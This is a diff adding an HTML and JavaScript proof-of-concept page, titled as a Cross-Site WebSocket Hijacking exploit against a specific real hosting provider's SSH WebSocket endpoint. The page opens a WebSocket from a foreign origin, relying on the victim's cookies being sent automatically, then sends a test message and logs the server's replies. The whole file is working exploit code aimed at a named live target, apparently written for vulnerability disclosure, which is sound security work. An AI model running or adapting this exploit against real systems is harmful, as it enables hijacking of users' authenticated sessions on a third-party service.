@@ -1,0 +1,67 @@
+ <!DOCTYPE html>
+  <html>
+  <head>
+      <title>CSWSH PoC - admin3-webhosting-ssh.infomaniak.com</title>
+      <style>
+          body { font-family: monospace; padding: 20px; background: #1a1a1a; color: #0f0; }
+          .log { background: #000; padding: 10px; height: 400px; overflow-y: auto; border: 1px solid #0f0; }
+          .success { color: #f00; font-weight: bold; }
+          .sent { color: #ff0; }
+          .recv { color: #0ff; }
+          button { background: #0f0; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-size: 16px; }
+          button:hover { background: #0c0; }
+      </style>
+  </head>
+  <body>
+      <h1>🔴 CSWSH Exploit - admin3-webhosting-ssh.infomaniak.com</h1>
+      <p>Target: <code>wss://admin3-webhosting-ssh.infomaniak.com/</code></p>
+      <p>Origin: <code id="origin"></code></p>
+      <button onclick="connect()">🚀 Launch Exploit</button>
+      <button onclick="clearLog()" style="background:#333;color:#fff;margin-left:10px">Clear</button>
+      <div class="log" id="log"></div>
+
+      <script>
+          const logEl = document.getElementById("log");
+          document.getElementById("origin").textContent = window.location.origin;
+
+          function log(msg, cls="") {
+              const line = document.createElement("div");
+              line.className = cls;
+              line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+              logEl.appendChild(line);
+              logEl.scrollTop = logEl.scrollHeight;
+          }
+
+          function clearLog() { logEl.innerHTML = ""; }
+
+          function connect() {
+              log("[*] Initiating WebSocket connection...");
+              log("[*] Browser will send victim's cookies automatically");
+
+              const ws = new WebSocket("wss://admin3-webhosting-ssh.infomaniak.com/");
+
+              ws.onopen = () => {
+                  log("[+] CONNECTION ESTABLISHED - CSWSH SUCCESSFUL!", "success");
+                  log("[+] Server accepted connection from: " + window.location.origin, "success");
+                  log("[>] Sending test message...", "sent");
+                  ws.send("CSWSH_POC_" + Date.now());
+              };
+
+              ws.onmessage = (e) => {
+                  log("[<] Received: " + e.data, "recv");
+              };
+
+              ws.onclose = (e) => {
+                  log("[!] Closed: Code=" + e.code + " Reason=" + (e.reason || "none"), "success");
+              };
+
+              ws.onerror = (e) => {
+                  log("[!] Error (check DevTools Network tab)", "success");
+              };
+
+              // Auto-close after 15s
+              setTimeout(() => { ws.close(1000, "PoC done"); }, 15000);
+          }
+      </script>
+  </body>
+  </html>
